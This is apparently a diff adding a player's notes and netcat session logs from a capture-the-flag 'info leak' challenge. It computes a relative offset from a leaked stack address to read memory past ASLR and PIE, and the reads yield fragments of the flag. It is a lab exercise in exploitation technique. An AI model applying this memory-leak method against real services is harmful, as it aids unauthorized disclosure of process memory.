@@ -1,0 +1,64 @@
+0 is the esp
+4 is the info we want
+hex(0x100000000+info_we_want-esp)
+
+increment by 4 until nil.
+
+0x6f636573
+
+javantea@dolly:~$ nc 172.31.1.37 1615
+OpenCTF tyro info leak 2
+
+ASLR is on, the binary is PIE
+Can you read the flag?
+RELATIVE READS ONLY HERE
+Offset: 0
+0xffe16d04
+Offset: 4
+0x57d3c008
+Offset: 57f25304 
+0x6f636573
+Offset: javantea@dolly:~$ 
+javantea@dolly:~$ nc 172.31.1.37 1615
+OpenCTF tyro info leak 2
+
+ASLR is on, the binary is PIE
+Can you read the flag?
+RELATIVE READS ONLY HERE
+Offset: 0
+0xff8dc3f4
+Offset: 4
+0x57046008
+Offset: 57769c14
+0x6f636573
+Offset: 57769c18
+0x745f646e
+Offset: 57769c1c
+0x5f6f7279
+Offset: 57769c20
+0x6f666e69
+Offset: 57769c24
+0x61656c5f
+Offset: 57769c28
+0x414d5f6b
+
+javantea@dolly:~$ nc 172.31.1.37 1615
+OpenCTF tyro info leak 2
+
+ASLR is on, the binary is PIE
+Can you read the flag?
+RELATIVE READS ONLY HERE
+Offset: 0
+0xffebdbe4
+Offset: 4
+0x578b1008
+Offset: 0x579f3434
+0x61656c5f
+Offset: 0x579f3438
+0x414d5f6b
+Offset: 0x579f343c
+0x4f594544
+Offset: 0x579f3440
+0x534f4455
+Offset: 0x579f3444
+0x4d454d4f
